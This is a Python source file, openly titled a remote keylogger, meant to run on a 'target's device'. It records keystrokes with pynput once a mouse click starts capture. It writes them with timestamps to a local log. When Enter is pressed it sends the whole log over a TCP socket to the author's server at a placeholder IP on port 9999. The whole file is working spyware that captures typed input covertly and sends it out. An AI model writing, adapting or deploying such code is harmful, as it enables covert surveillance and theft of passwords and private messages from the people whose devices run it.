# Remote Keylogger from dylbyday - Sends keystroke log file to my device remotely with target IP

# ensure this is running on target's device

# IMPORT LIBRARIES
from pynput.keyboard import Listener as KeyboardListener # captures keystrokes
from pynput.mouse import Listener as MouseListener # detects mouse clicks
import socket # enables network communication via TCP
from datetime import datetime # adds timestamps to log entries

# INITIAL CONFIGURATION
SERVER_IP = "xxx.xxx.x.xxx" # IP address receiving keylogger information (my public IP)
PORT = 9999 # specifies port for socket to send keystroke data
buffer = "" # space to store keystroke data before logging
is_listening = False # tracks if keylogger is actively capturing (True = on, False = off)
keyboard_listener = None # holds the keyboard listener object, starts empty
log_file = "keystrokes_log.txt" # name of the local file storing keystrokes

# NETWORKING CONFIGURATION
def send_data():
    # Sends entire keystroke log file to my server
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # creates TCP socket for IPv4
            s.connect((SERVER_IP, PORT)) # connects to my server at IP:port
            with open(log_file, "r") as f: # reads local log file
                file_data = f.read()
            s.send(file_data.encode()) # sends log file contents as bytes (not just buffer)
    except Exception as e:
        print(f"Error sending data: {e}") # catches network errors (e.g., server offline)

# LOG (WITH TIMESTAMPS)
def log_to_file(data):
    # Saves keystrokes to local file with timestamp
    try:
        with open(log_file, "a") as f: # opens log file in append mode, 'f' is file handle
            f.write(f"[{datetime.now()}] {data}\n") # adds timestamp and keystrokes
    except Exception as e:
        print(f"Error writing to file: {e}") # catches file errors

# KEYBOARD PARAMETERS WHILE RUNNING
def on_press(key):
    # Captures each keypress into buffer, including special keys like Backspace
    global buffer # calls the buffer space
    key_str = str(key).replace("'", "") # removes unwanted apostrophes
    if key_str == "Key.space": # converts space bar press to a single space
        key_str = " "
    elif key_str == "Key.backspace": # converts backspace to [del] in log
        key_str = "[del]"
    elif key_str == "Key.enter": # adds Enter as newline and stops
        buffer += "\n" # includes Enter in buffer as a newline
        stop_listening()
        return
    elif key_str.startswith("Key."): # skips other special keys (e.g., Key.shift)
        return
    buffer += key_str # adds keystrokes to buffer space

# KEYBOARD START REQUIREMENTS
def start_listening():
    # Starts capturing on left-click if not already active
    global is_listening, keyboard_listener # calls from pynput library
    if not is_listening: # if not listening, start listening
        keyboard_listener = KeyboardListener(on_press=on_press)
        keyboard_listener.start()
        is_listening = True
        print("Capturing:") # signifies capture has started

# KEYBOARD STOP REQUIREMENTS
def stop_listening():
    # Stops capture and sends log file when Enter is pressed
    global is_listening, keyboard_listener, buffer
    if is_listening: # if listening, stop listening
        keyboard_listener.stop() # stops listener
        if buffer:
            log_to_file(buffer) # saves buffer to local log file
            send_data() # sends log file contents to my device
        buffer = "" # resets buffer space
        is_listening = False
        print("Capturing Completed.") # signifies capture is done

# MOUSE PLACEMENT TRACKER + CAPTURE START
def on_click(x, y, button, pressed): # on_click tracks click location (x, y)
    # Logs mouse click position and starts capture
    global is_listening
    if button == button.left and pressed and not is_listening:
        log_to_file(f"Mouse was clicked at ({x}, {y})") # logs click coordinates
        start_listening() # starts capture if left mouse clicked and not capturing
    return True # keeps listener running

# MAIN FUNCTION
def run_keylogger():
    # Runs the keylogger, starting mouse listener
    mouse_listener = MouseListener(on_click=on_click)
    mouse_listener.start() # starts scanning for mouse clicks
    mouse_listener.join() # keeps program running by waiting for listener

# PROGRAM ENTRY POINT
if __name__ == "__main__":
    run_keylogger() # runs keylogger when script is executed directly
